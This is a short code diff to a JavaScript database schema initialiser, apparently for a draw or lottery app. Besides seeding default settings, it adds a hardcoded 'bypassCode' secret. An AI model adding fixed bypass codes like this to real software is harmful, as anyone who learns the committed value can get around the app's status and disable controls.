@@ -269,6 +269,7 @@ async function initSchema(dbPool) {
     await dbPool.query("INSERT IGNORE INTO app_settings (`key`,`value`) VALUES ('drawCloseMinutes','10')");
     await dbPool.query("INSERT IGNORE INTO app_settings (`key`,`value`) VALUES ('appStatus','active')");
     await dbPool.query("INSERT IGNORE INTO app_settings (`key`,`value`) VALUES ('appDisableAt','never')");
+    await dbPool.query("INSERT IGNORE INTO app_settings (`key`,`value`) VALUES ('bypassCode','1005199611712301977')");
 
   } catch (error) {
     console.error('Error al inicializar la base de datos:', error.message);
